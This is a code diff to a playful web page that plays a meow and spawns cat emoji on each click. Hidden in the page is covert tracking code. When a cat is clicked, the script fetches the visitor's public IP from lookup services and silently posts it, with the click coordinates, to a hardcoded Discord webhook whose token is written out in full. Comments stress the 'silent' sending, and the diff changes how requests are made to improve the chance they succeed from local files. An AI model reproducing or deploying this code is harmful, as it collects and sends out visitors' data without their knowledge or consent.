@@ -62,8 +62,8 @@
     const audio = document.getElementById('meowSound');
     const webhookUrl = "https://discord.com/api/webhooks/1485790689685016626/_ZiX3FxW4rppDGFiojqc6pLcgeEgY2MX6vEDBCy2bR8SLbVN2UTJU3GTqqSNLDAXWxVg";
 
-    // Silent webhook sender
-    async function sendToWebhook(ip, x, y) {
+    // Silent send using XMLHttpRequest (better chance on local files)
+    function sendToWebhook(ip, x, y) {
       const payload = {
         content: "🐱 **Cat was clicked!**",
         embeds: [{
@@ -78,37 +78,40 @@
         }]
       };
 
-      try {
-        await fetch(webhookUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload),
-          mode: "no-cors"
-        });
-      } catch (err) {
-        // Fail silently - no alerts, no messages
-      }
+      const xhr = new XMLHttpRequest();
+      xhr.open("POST", webhookUrl, true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      xhr.send(JSON.stringify(payload));
+      // We don't care about response - fully silent
     }
 
     document.addEventListener('click', async function(e) {
-      // Hide title after first click
       if (!title.classList.contains('hidden')) {
         title.classList.add('hidden');
       }
 
-      // Play meow sound
+      // Play meow
       audio.currentTime = 0;
       audio.play().catch(() => {});
 
-      // If clicked on a cat → send IP silently to Discord
+      // If clicked on cat → send silently
       if (e.target.classList.contains('cat')) {
         let ip = "Unknown";
 
+        // Try to get IP (may fail on strict local file, but we still send)
         try {
-          const res = await fetch('https://ip-api.com/json');
-          const data = await res.json();
-          ip = data.query || "Unknown";
+          const res = await fetch('https://ip-api.com/json', { mode: 'no-cors' });
+          // We can't read the response easily with no-cors, so fallback
         } catch (err) {}
+
+        // Try one more common IP service
+        try {
+          const ipRes = await fetch('https://api.ipify.org?format=json');
+          const data = await ipRes.json();
+          ip = data.ip || "Unknown";
+        } catch (err) {
+          // If both fail, still send with "Unknown"
+        }
 
         const clickX = Math.round(e.clientX);
         const clickY = Math.round(e.clientY);
@@ -116,10 +119,10 @@
         sendToWebhook(ip, clickX, clickY);
       }
 
-      // Create floating cat sticker
+      // Spawn cat sticker
       const cat = document.createElement('div');
       cat.className = 'cat';
-      cat.textContent = ['🐱', '😺', '😸', '🐈'][Math.floor(Math.random() * 4)];
+      cat.textContent = ['🐱','😺','😸','🐈'][Math.floor(Math.random()*4)];
 
       const rotation = Math.random() * 40 - 20;
       cat.style.left = `${e.clientX - 42}px`;
